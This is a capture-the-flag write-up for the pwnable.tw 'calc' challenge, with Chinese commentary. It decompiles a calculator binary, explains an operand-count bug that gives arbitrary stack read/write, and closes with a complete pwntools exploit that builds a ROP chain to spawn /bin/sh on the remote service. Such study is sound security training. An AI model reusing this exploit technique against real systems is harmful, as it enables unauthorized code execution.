# calc

## checksec

```shell
[*] '/home/niebelungen/Desktop/pwnable.tw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## ida

**main:**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

**calc:**

```c
unsigned int calc()
{
  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(s, 0x400u);
    if ( !get_expr(s, 1024) )
      break;
    init_pool(v1);
    if ( parse_expr((int)s, v1) )
    {
      printf("%d\n", v1[v1[0]]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v3;
}
```

**get_expr:**

```c
int __cdecl get_expr(int a1, int a2)
{
  int v2; // eax
  char v4; // [esp+1Bh] [ebp-Dh] BYREF
  int v5; // [esp+1Ch] [ebp-Ch]

  v5 = 0;
  while ( v5 < a2 && read(0, &v4, 1) != -1 && v4 != 10 )
  {
    if ( v4 == 43 || v4 == 45 || v4 == 42 || v4 == 47 || v4 == 37 || v4 > 47 && v4 <= 57 )
    {
      v2 = v5++;
      *(_BYTE *)(a1 + v2) = v4;
    }
  }
  *(_BYTE *)(v5 + a1) = 0;
  return v5;
}
```

**parse_expr:**

```c
int __cdecl parse_expr(int a1, _DWORD *num)
{
  int v3; // eax
  int v4; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int v6; // [esp+28h] [ebp-80h]
  int v7; // [esp+2Ch] [ebp-7Ch]
  char *s1; // [esp+30h] [ebp-78h]
  int left_num; // [esp+34h] [ebp-74h]
  char s[100]; // [esp+38h] [ebp-70h] BYREF
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  v4 = a1;
  v6 = 0;
  bzero(s, 0x64u);
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)(*(char *)(i + a1) - 48) > 9 )
    {
      v7 = i + a1 - v4;
      s1 = (char *)malloc(v7 + 1);
      memcpy(s1, v4, v7);
      s1[v7] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
      left_num = atoi(s1);
      if ( left_num > 0 )
      {
        v3 = (*num)++;
        num[v3 + 1] = left_num;
      }
      if ( *(_BYTE *)(i + a1) && (unsigned int)(*(char *)(i + 1 + a1) - 48) > 9 )
      {
        puts("expression error!");
        fflush(stdout);
        return 0;
      }
      v4 = i + 1 + a1;
      if ( s[v6] )                              // 判断当前操作符是否为第一个操作符
                                                // 是则继续遍历寻找下一个操作符
                                                // 否则对前面的式子进行计算
      {
        switch ( *(_BYTE *)(i + a1) )
        {
          case '%':
          case '*':
          case '/':
            if ( s[v6] != 43 && s[v6] != 45 )
              goto LABEL_14;
            s[++v6] = *(_BYTE *)(i + a1);
            break;
          case '+':
          case '-':
LABEL_14:
            eval(num, s[v6]);
            s[v6] = *(_BYTE *)(i + a1);
            break;
          default:
            eval(num, s[v6--]);
            break;
        }
      }
      else
      {
        s[v6] = *(_BYTE *)(i + a1);
      }
      if ( !*(_BYTE *)(i + a1) )
        break;
    }
  }
  while ( v6 >= 0 )
    eval(num, s[v6--]);
  return 1;
}
```

**eval:**

```c
_DWORD *__cdecl eval(_DWORD *a1, char a2)
{
  _DWORD *result; // eax

  if ( a2 == '+' )
  {
    a1[*a1 - 1] += a1[*a1];
  }
  else if ( a2 > '+' )
  {
    if ( a2 == '-' )
    {
      a1[*a1 - 1] -= a1[*a1];
    }
    else if ( a2 == '/' )
    {
      a1[*a1 - 1] /= (int)a1[*a1];
    }
  }
  else if ( a2 == '*' )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```

`get_expr`用来获取输入的表达式，`parse_expr`用来进行处理式子。计算器大致的思路就是num数组只接受操作数，如果接收的操作符不是第一个操作符就进行计算。那么就有这样一个漏洞：

```text
输入：+300   这时有一个操作数  *a1=1  *a2='+'  num[1]=300  
num[1-1]+=num[1]  ===>   num[0]=301 
最后--*a1          ===>   num[0]=300
那么v1[v1[0]]      ===>   v1[300]
若输入：+300-100
+300的计算同上
num[0]-=num[1]    ===>   num[300]=num[300]-100
实现了任意地址读写的,调试发现361处对应了返回地址
```

那么我们这样构造栈结构：

```text
361===> |pop_eax_addr	|
362		|0xb			|
363		|pop_edx_addr	|
364		|0				|
365		|pop_ecx_ebx	|
366		|0				|
367		|&('/bin/sh')	|
368		|int_0x80_addr	|
369		|'/bin'			|
370		|'/sh\x00'		|
```

计算栈的地址：

```assembly
.text:08049453                 mov     ebp, esp
.text:08049455                 and     esp, 0FFFFFFF0h
.text:08049458                 sub     esp, 10h
```

main函数中，可知：main_stack_size=ebp&0xFFFFFFF0-0x10

则返回地址到ebp为main函数栈，长度为：index=main_stack_size/4+1

那么字符串的地址为：bin_sh=ebp-(index-8)*4，注意栈的增长方向。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./calc'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10100)

elf = ELF(binary,checksec=False)
ret_addr=0x08049499
pop_eax =0x0805c34b #361   362:11
pop_edx =0x080701aa #363   364:0
pop_ecx =0x080701d1 #365   366:0   367:&(/bin/sh)
int_0x80=0x08049a21 #368   369:'/bin/sh'

gadget=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,0xffffffff,0x08049a21,0x6e69622f,0x0068732f]

p.recv()
for i in range(0,6):
    p.sendline('+'+str(361+i))
    val=int(p.recv())
    offset=int(gadget[i])-val
    if offset>0:
    	p.sendline('+'+str(361+i)+'+'+str(offset))
    else:
        p.sendline('+'+str(361+i)+str(offset))
    result=int(p.recv())
    log.success(str(361+i)+'==>'+hex(result))
          
p.sendline('+360')
stackbase=int(p.recv())
stacksize=stackbase+0x100000000-((stackbase+0x100000000) & 0xFFFFFFF0-16)
bin_sh=stackbase+(8-(24/4+1))*4

p.sendline('+367')
val_367=int(p.recv())
offset=bin_sh-val_367
if offset>0:
	p.sendline('+'+str(367)+'+'+str(offset))
else:
    p.sendline('+'+str(367)+str(offset))
result=int(p.recv())
log.success(str(367)+'==>'+hex(result))    

for i in range(7,10):
    p.sendline('+'+str(361+i))
    val=int(p.recv())
    offset=int(gadget[i])-val
    if offset>0:
    	p.sendline('+'+str(361+i)+'+'+str(offset))
    else:
        p.sendline('+'+str(361+i)+str(offset))
    result=int(p.recv())
    log.success(str(361+i)+'==>'+hex(result))
#gdb.attach(p)
p.sendline('Niebelungen')

p.interactive()
```

